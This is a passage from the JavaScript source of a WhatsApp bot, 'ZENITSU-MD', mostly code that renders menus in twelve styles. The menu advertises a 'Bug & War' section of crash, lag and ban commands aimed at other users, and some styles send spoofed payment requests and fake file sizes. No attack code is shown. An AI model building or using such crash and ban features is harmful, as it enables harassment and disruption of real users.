┋⍟┃ ${prefix}sound155
┋⍟┃ ${prefix}sound156
┋⍟┃ ${prefix}sound157
┋⍟┃ ${prefix}sound158
┋⍟┃ ${prefix}sound159
┋⍟┃ ${prefix}sound160
┋⍟┃ ${prefix}sound161
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *List Vnn* *❂⊷*
╏✺╭─────────────❂
┋⍟┃  Omfoo
┋⍟┃  Omo
┋⍟┃  Omfo
┋⍟┃  Oo
┋⍟┃  Mera
┋⍟┃  Oh
┋⍟┃  🙂
┋⍟┃  Kiya
┋⍟┃  🥲
┋⍟┃  Kya
┋⍟┃  No
┋⍟┃  🦄
┋⍟┃  Gn
┋⍟┃  Good night
┋⍟┃  Gud night
┋⍟┃  Nighty
┋⍟┃  Good morning
┋⍟┃  Morning
┋⍟┃  Gm
┋⍟┃  Sad
┋⍟┃  Wtf
┋⍟┃  Wah
┋⍟┃  Ohhh
┋⍟┃  Everthing
┋⍟┃  Done
┋⍟┃  Galat
┋⍟┃  Galti se
┋⍟┃  Galti ho gyi
┋⍟┃  Gaya
┋⍟┃  Hru?
┋⍟┃  Bhai
┋⍟┃  Shit
┋⍟┃  Wassup
┋⍟┃  How r u?
┋⍟┃  Lel
┋⍟┃  Hello
┋⍟┃  Hey
┋⍟┃  Hlo
┋⍟┃  Hii
┋⍟┃  Hi
┋⍟┃  Hmm
┋⍟┃  Dont leave me alone
┋⍟┃  Leave it
┋⍟┃  Leave me alone
┋⍟┃  Lmao
┋⍟┃  Lol
┋⍟┃  Moj kar di
┋⍟┃  Moj kr di
┋⍟┃  Cool
┋⍟┃  Ass hole
┋⍟┃  Baka
┋⍟┃  Asshole
┋⍟┃  Bot
┋⍟┃  Bye
┋⍟┃  Byy
┋⍟┃  Byee
┋⍟┃  Chacha
┋⍟┃  Chapri
┋⍟┃  Gandu
┋⍟┃  Gaya
┋⍟┃  Good afternoon
┋⍟┃  Good
┋⍟┃  Hehe
┋⍟┃  How you doing
┋⍟┃  Huh
┋⍟┃  Lets go
┋⍟┃  Meri
┋⍟┃  Nah
┋⍟┃  Nhi
┋⍟┃  Okay
┋⍟┃  Op
┋⍟┃  Same here
┋⍟┃  Sorry
┋⍟┃  Toxic
┋⍟┃  Wow
┋⍟┃  Yeah
┋⍟┃  🔥
┋⍟┃  Yo
┋⍟┃  Thanks
┋⍟┃  Ty
┋⍟┃  Thnks
┋⍟┃  Owak
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Bug & War* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}xreact 
┋⍟┃ ${prefix}x 
┋⍟┃ ${prefix}x2 
┋⍟┃ ${prefix}iosbug 
┋⍟┃ ${prefix}iosbug2 
┋⍟┃ ${prefix}xaudio 
┋⍟┃ ${prefix}xaudio2 
┋⍟┃ ${prefix}xsticker 
┋⍟┃ ${prefix}xsticker2 
┋⍟┃ ${prefix}xloc 
┋⍟┃ ${prefix}xloc2 
┋⍟┃ ${prefix}xlist 
┋⍟┃ ${prefix}xlist2 
┋⍟┃ ${prefix}xkill 
┋⍟┃ ${prefix}xkill2 
┋⍟┃ ${prefix}xkillgc 
┋⍟┃ ${prefix}tempban 
┋⍟┃ ${prefix}xcrash 
┋⍟┃ ${prefix}xcrash2 
┋⍟┃ ${prefix}xioscrash 
┋⍟┃ ${prefix}xioscrash2 
┋⍟┃ ${prefix}iosgoogle 
┋⍟┃ ${prefix}iosgoogle2 
┋⍟┃ ${prefix}iosq 
┋⍟┃ ${prefix}amountbug 
┋⍟┃ ${prefix}pmbug 
┋⍟┃ ${prefix}delaybug 
┋⍟┃ ${prefix}docubug 
┋⍟┃ ${prefix}unlimitedbug 
┋⍟┃ ${prefix}bombug 
┋⍟┃ ${prefix}lagbug 
┋⍟┃ ${prefix}trollybug 
┋⍟┃ ${prefix}gcbug 
┋⍟┃ ${prefix}delaygcbug 
┋⍟┃ ${prefix}laggcbug 
┋⍟┃ ${prefix}bomgcbug 
┋⍟┃ ${prefix}unlimitedgcbug 
┋⍟┃ ${prefix}trollygcbug 
┋⍟┃ ${prefix}docugcbug 
┋⍟┃ ${prefix}verif 
┋⍟┃ ${prefix}banv1 
┋⍟┃ ${prefix}banv2 
┋⍟┃ ${prefix}banv3 
┋⍟┃ ${prefix}banv4 
┋⍟┃ ${prefix}banv5 
┋⍟┃ ${prefix}banv6 
┋⍟┃ ${prefix}unbanv1 
┋⍟┃ ${prefix}unbanv2 
┋⍟┃ ${prefix}unbanv3 
┋⍟┃ ${prefix}unbanv4 
┋⍟┃ ${prefix}unbanv5 
┋⍟╰───────────────
╰═════════════════⍟

*╭────❂* *Other Menu* *❂⊷*
╏✺╭─────────────❂
┋⍟┃ ${prefix}ping 
┋⍟┃ ${prefix}menu 
┋⍟┃ ${prefix}myip 
┋⍟┃ ${prefix}repo 
┋⍟┃ ${prefix}reportbug 
┋⍟┃ ${prefix}idgroup 
┋⍟┃ ${prefix}owner 
┋⍟┃ ${prefix}rentbot 
┋⍟┃ ${prefix}donate 
┋⍟┃ ${prefix}runtime 
┋⍟┃ ${prefix}checkaccount 
┋⍟╰───────────────
╰═════════════════⍟
❂ *ZENITSU-BOT MULTI DEVICE* ❂

_Thanks For choosing ZENITSU-MD_

*————— ❂ —————*

  *𝙕𝙚𝙣𝙞𝙩𝙨𝙪-𝘽𝙤𝙩*                                         
*╰═════════════❂*`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"PHOTOXY MENU",
"title":"click to display",
"description":"Displays The List Of Photooxy Features",
"id":"${prefix}photooxymenu"},
{"header":"NSFW MENU",
"title":"click to display",
"description":"Displays The List Of NSFW Features",
"id":"${prefix}nsfwmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'allmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${allmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'ownermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
